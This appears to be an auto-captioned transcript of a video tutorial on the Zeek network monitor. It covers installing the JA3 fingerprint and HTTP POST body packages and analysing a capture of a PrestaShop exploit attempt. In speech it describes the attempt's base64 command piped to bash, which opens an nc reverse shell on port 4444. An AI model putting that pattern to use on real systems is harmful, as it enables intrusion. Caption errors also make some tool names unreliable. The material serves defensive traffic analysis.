like the HTTP POST data that is actually in a package and also for like the SSL it's not getting the JA three signature which is like a fingerprint I'm an SSL handshake and essentially what it does is takes all like the SSL offerings and hashes it and that's essentially a JA three fingerprint to my knowledge and it becomes super handy because maybe cobalt strike SSL webserver doesn't offer the exact same as a cell methods as apache so it's a quick way to identify what type of web server it is and kind of get fingerprints and if you ever see things change that's when you may have issues so let's go start installing those and zkg is the package manager physique so we'll have to install it with pip so pip three install zkg and then I think we can just do like zkg search ja3 no matches ja3 lowercase so it is case-sensitive so there are two things that have it we have awesome and salesforce I'm going to do the Salesforce one so zkg install this and we have a weird error message let's grab this Google paste github so this is in the get package and this is get python package so this looks like it's in the correct spot let's see workaround let's just try running this pip3 you should always do things in virtual and but darker or something who knows what's gonna screw up ah truffle hog let's do pip uninstall truffle hog pip3 yes now let's redo this command zkg where's the install zkg install there we go no longer errors or you can also search for HTP - post and we have a core light module so we can do zkg install this ok then I have to find local Zeke and add something because right now it's not gonna do anything it's not in the config there's probably a better way to do it than what I'm about to do but oh well look cool Zeke let's see that is in here load think it's packages inside the package of packages it doesn't work we'll try it again so we can remove everything Zeke - see what do user local Z share Z site local dot Z to specify this config let's try package can't find it z kg auto comp the Auto config that say install zkg Quick Start Guide pip install zkg Auto config packages that maybe we can do zkg load ja3 okay so we just need to load them so zkg load is an HTTP POST bodies locate HP post load log add HTTP post bodies there we go so now when I run this last - s-http do we have that we do have post body so if I cat HTP log Z cut on post body sort unique - see we have two things this is going to be where we got the username and password and then here this looks like a command dear customer blah blah blah customer service - OH proxy command equals echo ifs and does some things so let's grab this string I don't have Wireshark open anymore so let's go into Wireshark so FTP Wireshark Ibo one instant pcap because Zeke did truncate what I was looking at we see dot dot dot so that's why I want to go into Wireshark and grab everything so let's do search for string packet bytes pasted by that base64 to get there and then we can right click follow TCP stream and let's see so this is dealing with PrestaShop so this is a PrestaShop vulnerability and let's just find that string there we go so it does this echo ifs bunch of base64 and then base64 - D pipe it to bash so echo - n base64 - D to see exactly what this is and we see it's an exploit attempt and it looks like it's kind of doing a forward shell I think let's see nope this is a reverse shell on port four four four four so NC IP address four four four four and going out so that's definitely interesting and would be great to have for isset response you can also look at your SSL log now last - s a cell wall JA three we have it it is there and that's server and hello so this packet doesn't have that much information or that many SSL connections so not really that good but definitely nice to have what happens if we just Google this no mitad JA three so that's fingerprint see if it knows exactly what that is it may just be a common one for like Apache or something now when does it come with anything but that's definitely interesting that this was found but yeah that is a quick intro to Zeke I would highly recommend playing around with it and pcaps to see what you can see there is packet filter I don't know what this one is this may tell drop packets - ass files I guess files is a good one to look at real quick let's see is there a name see we know root should be in here grep - I root see stir nope it's only in HTTP log so well that's gonna be the video I hope you guys enjoyed it take care and I'll see you all next week